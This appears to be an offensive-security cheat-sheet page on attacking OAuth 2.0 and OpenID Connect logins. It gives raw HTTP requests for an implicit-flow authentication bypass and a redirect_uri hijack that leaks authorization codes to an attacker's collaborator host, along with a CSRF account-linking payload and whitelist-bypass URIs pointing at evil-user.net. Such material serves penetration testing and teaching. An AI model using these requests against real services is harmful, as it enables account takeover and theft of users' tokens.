---
title: Oauth
description: While browsing the web, you've almost certainly come across sites that let you log in using your social media account. The chances are that this feature is built using the popular OAuth 2.0 framework. OAuth 2.0 is highly interesting for attackers because it is both extremely common and inherently prone to implementation mistakes. This can result in a number of vulnerabilities, allowing attackers to obtain sensitive user data and potentially bypass authentication completely.
---



## Authentication bypass via OAuth implicit flow

Check if authentication on the target server depends solely on the OAuth token or if it also uses username/email parameters provided by clientside. As an example the next request sends the token and email+username.


```http
POST /authenticate HTTP/1.1
Host: {{ target-domain vulerable.net }}
Cookie: session=n20zBuYgGlReeEXCjbsonkzq2qaH8txt
Content-Length: 103
Content-Type: application/json
Connection: close

{"email":"wiener@hotdog.com","username":"wiener","token":"YwLD1AxRtNly8VTIg63UxtFkHlfkweeFIwtG7O9V8ho"}
```

The server only checks if the token is valid, and then logs-in to the indicated username/email. In this request, using the same token from an account we control, we can authenticate as other user simply by changing email/username:

```http
POST /authenticate HTTP/1.1
Host: {{ target-domain vulerable.net }}
Cookie: session=n20zBuYgGlReeEXCjbsonkzq2qaH8txt
Content-Length: 103
Content-Type: application/json
Connection: close

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"YwLD1AxRtNly8VTIg63UxtFkHlfkweeFIwtG7O9V8ho"}
```

This could lead to a full account takeover.

## OAuth account hijacking via redirect_uri

This vulnerability affects the OAuth provider or its configuration. Not limiting the `redirect_uri` parameter, could result in a CSRF-like vulnerability where an attacker could steal authorization codes. The victim just has to visit a malicious link where the `redirect_uri` parameter was changed to an attacker-controlled server.

```http
GET /auth?client_id=X&redirect_uri=https%3a%2f%2f{{ collaborator your.burpcollaborator.net }}&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: {{ target-domain vulerable.net }}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
```


This will result on the user being redirected to the attacker server leaking the _Authorization code_ on the `code` GET parameter as seen on the following request received on the burp collaborator:


```http
GET /oauth-callback?code=DMRc3iIkqJ1EhTj2GMRhmz9V_viFZlz6pEQJUI0odAc HTTP/1.1
Host: {{ collaborator your.burpcollaborator.net }}
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
```

## Flawed CSRF protection
The `state` parameter on OAuth is optional, but strongly recommended. This parameter works as a CSRF token.

You can force people into either using yor account or into linking your social media account to their vulnerable app account. A simple redirect to the `?code=` URL is what you are looking for.


```http
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: https://{{ target-domain vulerable.net }}/oauth-linking?code=PsM3KdpzzNnEfl4bYBIu0HgXkXiQd5Ge4zDbvGnKBRY

<a href="https://{{ target-domain vulerable.net }}/oauth-linking?code=PsM3KdpzzNnEfl4bYBIu0HgXkXiQd5Ge4zDbvGnKBRY">Click me</a>
```





## Additional tips

The `redirect_uri` must be limited to an specific whitelist. This could also be circumvented. A few tests should be carried out before giving up:
-  Try removing or adding arbitrary paths, query parameters, and fragments to **see what you can change without triggering an error**.
-  You might be able to exploit discrepancies between the **parsing of the URI**. You can try techniques such as:
  -  `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
-  You may occasionally come across **server-side parameter pollution** vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows:
  -  `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
-  Weird checks could be in place. Some servers give special treatment to **localhost URIs**; things such as subdomains like `localhost.evil-user.net` should be tested.
- **Don't limit your testing to the redirect_uri parameter**. You will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.
- Abusing **other vulnerabilities** on the same domain such as **open redirects** could also be handy. You could try URIs such as `https://client-app.com/oauth/callback/../../example/path` where theres open redirects. More vulnerabilities can be:
  - **Dangerous JavaScript that handles query parameters and URL fragments**: For example, insecure web messaging scripts can be great for this. In some scenarios, you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain.
  - **XSS vulnerabnilities**: Although XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the HTTPOnly attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability.
  - **HTML injection vulnerabilities**: In cases where you cannot inject JavaScript (for example, due to CSP constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the redirect_uri parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the _Referer_ header. For example, consider the following img element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the _Referer_ header of the request, including the query string.



## OpenID Connect
Basically extends OAuth to provide a more standarised, robust and reliable way of using OAuth as an authentication mechanism. The main addition is the **ID token** (`id_token`) response type. Is a more simple (requires less requests) way of using OAuth. Easily recognisable as it returns a Json Web Token (JWT).

Standard endpoint: `/.well-known/openid-configuration`

### Unprotected dynamic client registration
Some OpenID providers allow for a dynamic way of registering clients. This should be authenticated as attackers could register their own malicious client applications.

This could actually result in a SSRF vector where the vulnerable component is the OAuth provider. For example you could register an application and be able to provide a URL for the APP logo wich could be an SSRF attack.





## Saúl's _"seen in the wild"_ tips 

### Checking if the tokens were requested by the intended application

When using OAuth for authentication, the servers must check that the tokens they are receiving were not emmited for other apps. The attack would be like this:

1. Victim logs in using Google on a malicious rogue application.
2. Attacker controling the malicious application uses received OAuth/OpenID token to login on the vulnerable service.

More info at [Validating  an ID token](https://developers.google.com/identity/protocols/oauth2/openid-connect#validatinganidtoken)



